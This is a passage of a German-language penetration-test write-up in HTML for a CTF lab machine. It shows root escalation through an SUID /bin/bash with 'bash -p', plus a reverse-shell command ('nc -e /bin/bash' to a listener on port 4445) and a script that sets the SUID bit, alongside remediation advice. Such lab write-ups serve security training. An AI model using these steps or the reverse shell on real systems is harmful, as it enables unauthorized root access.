+                 <p class="analysis"><strong>1. Erstellen der Trigger-Datei:</strong> Der Benutzer liest `/robots.txt`, um den Namen `enlightenment` zu bestätigen, wechselt nach `/tmp` und erstellt dort die leere Trigger-Datei mit `touch enlightenment`.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die Trigger-Datei wurde erfolgreich erstellt.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Berechtigungen von `/bin/bash` und führen Sie dann `bash -p` aus.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die SUID-Berechtigung von `/bin/bash` und untersuchen Sie den Mechanismus, der `/tmp/enlightenment` als Trigger verwendet (falls es ein benutzerdefinierter Mechanismus ist).</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">moksha@hannah:/var/mail$ <span class="command">cat /var/www/html/robots.txt</span></div>
+                           <pre>Disallow: /enlightenment</pre>
+                           <div class="prompt">moksha@hannah:/var/mail$ <span class="command">cd /tmp/</span></div>
+                           <div class="prompt">moksha@hannah:/tmp$ <span class="command">touch enlightenment</span></div>
+                           <div class="prompt">moksha@hannah:/tmp$ <span class="command">ls</span></div>
+                           <pre>
+enlightenment  systemd-private-202988f380d242c8b3329e9a35ba6159-systemd-logind.service-foDxbh
+enlIghtenment  systemd-private-202988f380d242c8b3329e9a35ba6159-systemd-timesyncd.service-bgNOrh</pre> <!-- Beachte: enlIghtenment war schon da, enlightenment wurde neu erstellt -->
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>2. Überprüfung der SUID-Berechtigung und Ausführung von bash -p:</strong> Die Berechtigungen von `/bin/bash` werden überprüft, und das SUID-Bit (`s` in `-rwsr-xr-x`) wird bestätigt. Anschließend wird `/bin/bash -p` ausgeführt.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Der Befehl `ls -la /bin/bash` bestätigt die kritische Fehlkonfiguration: `/bin/bash` ist SUID root. Durch das Ausführen von `/bin/bash -p` (wahrscheinlich nachdem die Trigger-Datei `/tmp/enlightenment` erstellt wurde) erhält der Benutzer eine Shell mit `euid=0(root)`, wie durch `id` bestätigt.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Suchen Sie die Root-Flag.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sofort das SUID-Bit von `/bin/bash` (`chmod u-s /bin/bash`)!</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">moksha@hannah:/tmp$ <span class="command">ls -la /bin/bash</span></div>
+                           <pre>-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash</pre>
+                           <div class="prompt">moksha@hannah:/media$ <span class="command">/bin/bash -p</span></div> <!-- Verzeichnis /media ist hier seltsam, wahrscheinlich irrelevant -->
+                           <div class="prompt">bash-5.1# <span class="command">id</span></div>
+                           <pre>uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</pre>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>3. Auslesen der Root-Flag:</strong> Als Root wird in das `/root`-Verzeichnis gewechselt und die Datei `root.txt` ausgelesen.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">HMVHAPPYNY2023</span>` wird erfolgreich ausgelesen.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Dokumentieren Sie den Vorgang.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die SUID-Schwachstelle.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">bash-5.1# <span class="command">pwd</span></div>
+                           <pre>/media</pre>
+                           <div class="prompt">bash-5.1# <span class="command">cd</span></div>
+                           <div class="prompt">bash-5.1# <span class="command">pwd</span></div>
+                           <pre>/home/moksha</pre>
+                           <div class="prompt">bash-5.1# <span class="command">cd /root</span></div>
+                           <div class="prompt">bash-5.1# <span class="command">cat root.txt</span></div>
+                           <pre><span class="password">HMVHAPPYNY2023</span></pre>
+                      </div>
+                  </div>
+                  <p class="evaluation"><strong>Risikobewertung:</strong> Kritisch. Das gesetzte SUID-Bit auf `/bin/bash` stellt eine massive Fehlkonfiguration dar, die eine einfache und direkte Eskalation zu Root-Rechten ermöglicht.</p>
+                  <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie umgehend das SUID-Bit von `/bin/bash`: `chmod u-s /bin/bash`.</li>
+                        <li>Überprüfen Sie regelmäßig alle Dateien mit SUID/SGID-Berechtigungen (`find / -type f \( -perm -4000 -o -perm -2000 \) -ls`) und entfernen Sie die Bits von allen nicht absolut notwendigen Dateien.</li>
+                        <li>Implementieren Sie File Integrity Monitoring (FIM), um unerlaubte Änderungen an Systemdateien und deren Berechtigungen zu erkennen.</li>
+                        <li>Untersuchen Sie, warum die Trigger-Datei `/tmp/enlightenment` (falls relevant für den Exploit) eine Rolle spielt und ob dies auf weitere Konfigurationsprobleme hindeutet.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt scheint einen alternativen oder fehlgeschlagenen Versuch der Privilege Escalation zu beschreiben, der wahrscheinlich für eine andere Situation gedacht war oder auf einem Missverständnis beruhte, da Root bereits über `bash -p` erlangt wurde. Es wird ein Skript erstellt, das `chmod u+s /bin/bash` ausführt (obwohl Bash bereits SUID ist) und eine Reverse Shell startet. Dieses Skript wird nach `/media/` verschoben und versucht, durch eine Endlosschleife (`while true; do ls ...; done`) getriggert zu werden, vermutlich in der Hoffnung auf einen Cron-Job, der das Skript in `/media/` ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Methode ist im Kontext des bereits funktionierenden `bash -p`-Exploits unnötig und wahrscheinlich nicht der intendierte Weg auf dieser speziellen Maschine, da der `/tmp/enlightenment`-Trigger spezifischer erscheint. Obwohl der Listener auf Port 4445 eine Root-Shell empfängt, ist unklar, *was* diese Shell tatsächlich ausgelöst hat (vielleicht doch ein Cron-Job, der das Skript `/media/touch` ausführt?). Da aber `bash -p` bereits funktioniert hat, ist dieser Weg komplexer und redundant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser alternative Pfad kann im Bericht erwähnt werden, aber der Fokus sollte auf dem direkten Exploit über `bash -p` nach Erstellung der Trigger-Datei liegen, da dies im Log als erstes zum Erfolg führte.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie Cron-Jobs, die potenziell Skripte aus unsicheren Orten wie `/media/` ausführen könnten. Sichern Sie Verzeichnisse wie `/media/` mit restriktiven Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Beginn des alternativen/redundanten Versuchs -->
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">touch touch</span></div>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">ls -la</span></div>
+                     <pre>-rw-r--r--  1 moksha moksha    0 abr 13 17:22 touch</pre>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">nano touch</span></div>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">chmod +x touch</span></div>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">cat touch</span></div>
+                     <pre>
+#!/bin/bash
+
+chmod u+s /bin/bash</pre>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">mv touch /media</span></div>
+                     <div class="prompt">moksha@hannah:/tmp$ <span class="command">cd /media/</span></div>
+                     <div class="prompt">moksha@hannah:/media$ <span class="command">chmod 777 touch</span></div>
+                     <div class="prompt">moksha@hannah:/media$ <span class="command">while true; do ls -la /bin/bash; done</span></div>
+                     <pre>
+-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
+-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
+...</pre>
+                     <!-- Netcat Befehl aus dem Skript oder manuell? -->
+                     <pre>nc -e /bin/bash 192.168.2.129 4445</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener für den alternativen Versuch -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                     <pre>
+listening on [any] 4445 ...
+connect to [192.168.2.129] from (UNKNOWN) [192.168.2.127] 35784
+id
+uid=0(root) gid=0(root) grupos=0(root)</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                      <!-- Annahme: User-Flag-Pfad -->
+                     <div class="flag-command">cat /home/moksha/user.txt</div>
+                     <div class="flag-value"><span class="password">HMVGGHFWP2023</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVHAPPYNY2023</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-13</p>
+    </footer>
+</body>
+</html>
